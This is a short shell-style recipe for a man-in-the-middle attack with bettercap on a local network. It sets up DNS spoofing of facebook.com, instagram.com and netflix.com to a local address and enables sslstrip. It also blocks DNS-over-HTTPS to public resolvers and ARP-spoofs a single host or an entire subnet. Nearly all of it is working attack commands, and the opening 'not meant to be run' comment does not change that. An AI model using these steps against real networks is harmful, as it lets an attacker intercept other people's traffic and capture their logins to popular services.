#this script is not meant to be run, it is just a steps to perform a dns spoof with bettercap

sudo apt update && sudo apt install bettercap

#create a file as dns-spoof.cap and enter these lines
set dns.spoof.domains facebook.com,instagram.com,netflix.com
set dns.spoof.address 192.168.1.66
set dns.spoof.all true
#optional test both use whatever works
set http.proxy.sslstrip true
http.proxy on

sudo iptables -A OUTPUT -p tcp --dport 443 -d 1.1.1.1 -j DROP
sudo iptables -A OUTPUT -p tcp --dport 443 -d 8.8.8.8 -j DROP


sudo bettercap -iface eth0 -caplet dns-spoof.cap


# In Bettercap interactive console:
net.probe on
net.recon on
arp.spoof on
set arp.spoof.targets 192.168.31.144  #OR
set arp.spoof.targets 192.168.1.0/24  # to spoof dns for whole network
set arp.spoof.fullduplex true